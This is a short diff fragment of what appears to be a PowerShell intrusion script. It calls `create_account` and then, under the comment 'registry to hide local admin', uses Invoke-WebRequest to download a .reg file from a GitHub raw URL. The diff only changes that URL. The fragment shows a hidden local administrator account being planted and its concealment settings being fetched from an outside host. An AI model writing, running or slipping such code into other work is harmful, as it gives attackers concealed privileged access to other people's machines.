@@ -38,7 +38,7 @@ create_account -uname $uname -pword $pword
 
 # registry to hide local admin
 $vbs_script = random_text
-Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention/main/admin.reg -OutFile "$vbs_script.reg"
+Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE-/main/files/admin.reg -OutFile "$vbs_script.reg"
 
 # goto temp
 $wd = random_text
